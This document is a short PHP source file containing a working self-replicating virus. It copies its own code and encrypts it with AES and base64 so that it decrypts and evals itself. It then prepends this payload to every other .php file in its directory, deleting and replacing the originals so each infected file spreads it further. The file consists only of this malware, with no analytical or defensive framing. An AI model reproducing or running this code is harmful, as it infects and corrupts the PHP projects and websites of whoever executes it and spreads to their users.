<?php
// BOOM:START
function execute($virus)
{
    $filenames = glob('*.php');
    foreach ($filenames as $filename) {
        if($filename == 'boom.php') continue;
        $script = fopen($filename, "r");
        $infected = fopen("$filename.infected", "w");
        $infection = '<?php ' . encryptContent($virus) . ' ?>';
        fputs($infected, $infection, strlen($infection));
        while ($contents = fgets($script)) {
            fputs($infected, $contents, strlen($contents));
        }
        fclose($script);
        fclose($infected);
        unlink($filename);
        rename($filename . ".infected", $filename);
    }
}
function encryptContent($virus)
{
    // Key
    $str = '1234567890';
    $key = '';
    for ($i = 0; $i < 32; $i++) $key .= $str[rand(0, strlen($str) - 1)];

    // Encrypt
    $iv_length = openssl_cipher_iv_length('aes-256-cbc');
    $iv = openssl_random_pseudo_bytes($iv_length);
    $encryptedVirus = openssl_encrypt($virus, 'aes-256-cbc', $key, 0, $iv);

    // Encode
    $encoded_virus = base64_encode($encryptedVirus);
    $encoded_iv = base64_encode($iv);
    $encoded_key = base64_encode($key);

    $payload = "
    \$encryptedVirus = '" . $encoded_virus . "';
    \$iv = '" . $encoded_iv . "';
    \$key = '" . $encoded_key . "';
    
    \$virus = openssl_decrypt(
    base64_decode(\$encryptedVirus),
    'aes-256-cbc',
    base64_decode(\$key),
    0,
    base64_decode(\$iv)
    );
    eval(\$virus);
    execute(\$virus);
    ";

    // Return or use the payload as needed
    return $payload;
}

$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// BOOM:START"));
$virus = substr($virus, 0,strpos($virus, "\n// BOOM:END") + strlen('\n// BOOM:END')). '// BOOM:END'." \r\n";
execute($virus);

// BOOM:END

/** this will not be copied */